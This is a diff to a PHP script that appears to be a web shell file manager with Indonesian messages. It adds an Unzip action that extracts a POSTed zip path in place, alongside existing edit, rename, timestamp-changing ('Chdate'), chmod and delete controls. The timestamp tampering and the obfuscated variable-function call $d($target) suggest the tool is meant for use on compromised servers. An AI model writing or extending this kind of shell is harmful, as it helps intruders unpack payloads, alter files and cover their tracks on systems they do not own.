@@ -253,6 +253,38 @@ if(isset($_POST['chdate']) && isset($_POST['target']) && isset($_POST['new_date'
         $msg_type = "error";
     }
 }
+if(isset($_POST['unzip']) && isset($_POST['target'])){
+    $target = $_POST['target'];
+    $name = $d($target);
+
+    if(class_exists('ZipArchive')){
+        $zip = new ZipArchive;
+
+        if($zip->open($target) === TRUE){
+
+            $extractPath = dirname($target);
+
+            if($zip->extractTo($extractPath)){
+                $msg = "Unzip berhasil: " . htmlspecialchars($name);
+                $msg_type = "success";
+            } else {
+                $msg = "Gagal extract zip: " . htmlspecialchars($name);
+                $msg_type = "error";
+            }
+
+            $zip->close();
+
+        } else {
+            $msg = "Tidak bisa membuka zip: " . htmlspecialchars($name);
+            $msg_type = "error";
+        }
+
+    } else {
+        $msg = "ZipArchive tidak tersedia di server";
+        $msg_type = "error";
+    }
+}
+
 ?>
 <!DOCTYPE html>
 <html>
@@ -525,12 +557,25 @@ if($items && is_array($items)) {
             <button onclick="openModal(\'' . $editId . '\')" class="action-btn" style="color:#2ecc71;"><i class="fa fa-edit"></i><span class="tooltip">Edit</span></button>
             <button onclick="openModal(\'' . $renameId . '\')" class="action-btn" style="color:#3498db;"><i class="fa fa-pencil-square-o"></i><span class="tooltip">Rename</span></button>
             <button onclick="openModal(\'' . $chdateId . '\')" class="action-btn" style="color:#9b59b6;"><i class="fa fa-calendar"></i><span class="tooltip">Chdate</span></button>
-            <button onclick="openModal(\'' . $chmodId . '\')" class="action-btn" style="color:#f39c12;"><i class="fa fa-lock"></i><span class="tooltip">Chmod</span></button>
+            <button onclick="openModal(\'' . $chmodId . '\')" class="action-btn" style="color:#f39c12;"><i class="fa fa-lock"></i><span class="tooltip">Chmod</span></button>';
+        if(strtolower(pathinfo($file, PATHINFO_EXTENSION)) == 'zip'){
+            echo '
+            <form method="POST" style="display:inline;" onsubmit="return confirm(\'Extract zip ' . addslashes($file) . '?\')">
+                <input type="hidden" name="target" value="' . htmlspecialchars($fullpath) . '">
+                <button type="submit" name="unzip" class="action-btn" style="color:#1abc9c;">
+                    <i class="fa fa-file-archive-o"></i>
+                    <span class="tooltip">Unzip</span>
+                </button>
+            </form>';
+        }
+        echo '
             <form method="POST" style="display:inline;" onsubmit="return confirm(\'Hapus file ' . addslashes($file) . '?\')">
                 <input type="hidden" name="target" value="' . htmlspecialchars($fullpath) . '">
-                <button type="submit" name="delete" class="action-btn" style="color:#e74c3c;"><i class="fa fa-trash-o"></i><span class="tooltip">Delete</span></button>
+                <button type="submit" name="delete" class="action-btn" style="color:#e74c3c;">
+                    <i class="fa fa-trash-o"></i>
+                    <span class="tooltip">Delete</span>
+                </button>
             </form>
-          </td>
         </td>';
         echo '<div class="modal modal-editor" id="' . $editId . '">
             <span class="close" onclick="closeModal(\'' . $editId . '\')">&times;</span>
